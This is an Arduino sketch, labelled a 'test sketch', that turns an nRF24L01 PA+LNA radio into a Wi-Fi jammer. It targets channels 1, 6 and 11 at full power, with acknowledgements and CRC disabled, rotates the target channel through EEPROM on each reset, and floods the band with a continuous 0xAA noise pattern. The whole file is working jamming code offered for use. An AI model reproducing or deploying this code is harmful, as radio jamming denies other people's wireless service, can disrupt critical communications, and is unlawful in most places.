#include <SPI.h>
#include <nRF24L01.h>
#include <RF24.h>
#include <EEPROM.h>

/* * RF Engineer Test Sketch: nRF24L01 PA+LNA Jammer
 * Targeted Wi-Fi Channels: 1, 6, 11
 */

// CE on Pin 9, CSN on Pin 10
RF24 radio(9, 10);

const int EEPROM_CHANNEL_ADDR = 0;
const int LED_PIN = 8;

/* * REASONING:
 * nRF Frequency = 2400 + Register Value
 * Wi-Fi Ch 1 (2.412 GHz) -> Register 12
 * Wi-Fi Ch 6 (2.437 GHz) -> Register 37
 * Wi-Fi Ch 11 (2.462 GHz) -> Register 62
 */
const byte focusedChannels[] = {12, 37, 62}; 
const int NUM_FOCUSED_CHANNELS = sizeof(focusedChannels);

void setup() {
  Serial.begin(9600);
  pinMode(LED_PIN, OUTPUT);
  digitalWrite(LED_PIN, LOW);

  // 1. CHANNEL MANAGEMENT
  int currentChannelIndex = EEPROM.read(EEPROM_CHANNEL_ADDR);
  
  // Validation and cycling
  if (currentChannelIndex >= NUM_FOCUSED_CHANNELS || currentChannelIndex < 0) {
    currentChannelIndex = 0;
  }

  // 2. RADIO CONFIGURATION
  radio.begin();
  radio.setPALevel(RF24_PA_MAX);      // Full power for PA+LNA hardware
  radio.setDataRate(RF24_2MBPS);      // Max bandwidth (approx 2MHz spread)
  radio.setAutoAck(false);            // Disable ACK for pure TX
  radio.setRetries(0, 0);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.setPayloadSize(32);           
  radio.setChannel(focusedChannels[currentChannelIndex]);
  
  // Power down temporarily to ensure maximum current for LEDs
  radio.powerDown(); 

  // 3. PHASE 1: LED IDENTIFICATION (Visual Feedback)
  // 1 blink = Wi-Fi Ch 1 | 2 blinks = Wi-Fi Ch 6 | 3 blinks = Wi-Fi Ch 11
  int blinks = currentChannelIndex + 1;
  for (int i = 0; i < blinks; i++) {
    digitalWrite(LED_PIN, HIGH); delay(400);
    digitalWrite(LED_PIN, LOW);  delay(400);
  }

  // 4. INCREMENT EEPROM (For next power cycle/reset)
  int nextChannelIndex = (currentChannelIndex + 1) % NUM_FOCUSED_CHANNELS;
  EEPROM.update(EEPROM_CHANNEL_ADDR, nextChannelIndex);

  // 5. PHASE 2: STABILIZATION & SERIAL LOGGING
  Serial.print(F("Current Setup: "));
  if(currentChannelIndex == 0) Serial.println(F("Targeting Wi-Fi Ch 1 (2412MHz)"));
  if(currentChannelIndex == 1) Serial.println(F("Targeting Wi-Fi Ch 6 (2437MHz)"));
  if(currentChannelIndex == 2) Serial.println(F("Targeting Wi-Fi Ch 11 (2462MHz)"));
  delay(2000); 

  // 6. PHASE 3: COMMENCE TRANSMISSION
  radio.powerUp();
  radio.stopListening(); 
  radio.flush_tx();
}

void loop() {
  // 0xAA creates a 10101010 bit pattern, ideal for maximizing RF noise
  byte buffer[32];
  memset(buffer, 0xAA, 32); 

  // High-density "Firehose" loop
  while (true) {
    // startFastWrite provides the highest duty cycle for interference
    radio.startFastWrite(buffer, 32, true); 
    
    // Safety yield for the MCU watchdog
    static uint16_t watchdog = 0;
    if (watchdog++ > 2000) {
      yield();
      watchdog = 0;
    }
  }
}